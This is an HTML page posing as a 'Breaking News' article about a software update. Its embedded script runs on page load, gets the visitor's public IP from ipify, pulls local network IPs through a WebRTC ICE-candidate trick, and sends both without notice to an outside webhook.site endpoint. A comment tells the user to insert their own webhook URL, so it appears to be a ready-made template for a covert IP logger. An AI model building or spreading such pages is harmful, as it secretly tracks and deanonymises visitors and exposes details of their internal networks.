<!DOCTYPE html>
<html>
<head>
<title>Latest News</title>
<style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; color: #333; }
    .container { max-width: 800px; margin: 50px auto; padding: 20px; background: white; border-radius: 6px; }
    h1 { color: #0077cc; }
</style>
</head>
<body>
<div class="container">
    <h1>Breaking News: Major Update Released</h1>
    <p>Our team has just rolled out the latest update with exciting new features and security improvements. Stay tuned for more details as they come in.</p>
</div>

<script>
// Replace with your Webhook.site URL
const WEBHOOK_URL = "https://webhook.site/123abc45-678d-90ef-gh12-34567890abcd";

// Send data to Webhook.site
function logToWebhook(data) {
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).catch(err => console.error(err));
}

// Get Public IP from ipify
fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
        logToWebhook({ type: "Public IP", value: data.ip });
    });

// Try to get Local/Internal IP via WebRTC
async function getLocalIPs(callback) {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const ipMatch = regex.exec(event.candidate.candidate);
        if (ipMatch) callback(ipMatch[1]);
    };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
}

getLocalIPs(ip => {
    logToWebhook({ type: "Local IP", value: ip });
});
</script>
</body>
</html>
